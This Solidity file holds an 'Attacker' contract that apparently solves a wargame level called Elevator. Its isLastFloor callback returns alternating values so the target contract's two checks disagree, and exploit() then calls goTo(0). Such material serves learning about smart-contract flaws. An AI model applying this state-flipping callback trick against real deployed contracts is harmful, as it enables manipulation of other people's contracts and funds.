// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.13;
import "@levels/Elevator.sol";

contract Attacker is Building {
    Elevator public target;
    bool flip_res = true;

    constructor(address _target) payable {
        target = Elevator(_target);
    }

    function isLastFloor(uint) external override returns (bool) {
        flip_res = !flip_res;
        return flip_res;
    }

    receive() external payable {}

    function exploit() public payable {
        target.goTo(0);
    }
}
